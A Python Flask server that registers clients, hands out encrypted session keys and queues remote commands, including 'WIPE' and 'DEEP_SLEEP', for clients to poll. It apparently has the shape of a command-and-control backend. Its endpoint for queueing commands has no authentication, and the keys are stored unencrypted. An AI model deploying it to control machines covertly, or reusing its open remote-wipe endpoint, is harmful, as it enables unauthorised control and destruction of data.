from flask import Flask, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import logging
import base64
import os
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.serialization import load_pem_public_key

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///dduf.db'
db = SQLAlchemy(app)

logging.basicConfig(level=logging.INFO)

class Client(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    uuid = db.Column(db.String(64), unique=True, nullable=False)
    last_seen = db.Column(db.DateTime, default=datetime.utcnow)
    public_key = db.Column(db.Text)
    aes_key = db.Column(db.Text)

class Command(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.Integer, db.ForeignKey('client.id'))
    command = db.Column(db.String(64))
    executed = db.Column(db.Boolean, default=False)


def register_client(uuid):
    client = Client.query.filter_by(uuid=uuid).first()
    if not client:
        client = Client(uuid=uuid)
        db.session.add(client)
    client.last_seen = datetime.utcnow()
    db.session.commit()
    return client

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    client = register_client(data['uuid'])
    return jsonify({'id': client.id})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    data = request.get_json()
    client = register_client(data['uuid'])
    return jsonify({'status': 'ok'})

@app.route('/command/<uuid>', methods=['POST'])
def add_command(uuid):
    data = request.get_json()
    cmd = data.get('cmd')
    client = Client.query.filter_by(uuid=uuid).first()
    if not client or not cmd:
        return jsonify({'error': 'invalid'}), 400
    if cmd in ('SAFE_MODE', 'WIPE', 'DEEP_SLEEP'):
        logging.info('%s issued for %s', cmd, uuid)
    c = Command(client_id=client.id, command=cmd)
    db.session.add(c)
    db.session.commit()
    return jsonify({'status': 'queued'})

@app.route('/commands/<uuid>', methods=['GET'])
def get_commands(uuid):
    client = Client.query.filter_by(uuid=uuid).first()
    if not client:
        return jsonify({'commands': []})
    cmds = Command.query.filter_by(client_id=client.id, executed=False).all()
    result = [c.command for c in cmds]
    for c in cmds:
        c.executed = True
    db.session.commit()
    return jsonify({'commands': result})

@app.route('/update/<int:client_id>', methods=['POST'])
def update(client_id):
    return jsonify({'status': 'received'})

@app.route('/key_exchange', methods=['POST'])
def key_exchange():
    data = request.get_json(force=True)
    uuid = data.get('uuid')
    pub_pem = data.get('public_key')
    if not uuid or not pub_pem:
        return jsonify({'error': 'invalid'}), 400
    client = register_client(uuid)
    client.public_key = pub_pem
    public_key = load_pem_public_key(pub_pem.encode())
    aes_key = os.urandom(32)
    enc_key = public_key.encrypt(
        aes_key,
        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
    )
    client.aes_key = base64.b64encode(aes_key).decode()
    db.session.commit()
    return jsonify({'aes_key': base64.b64encode(enc_key).decode()})

if __name__ == '__main__':
    db.create_all()
    app.run(host='0.0.0.0', port=5000)
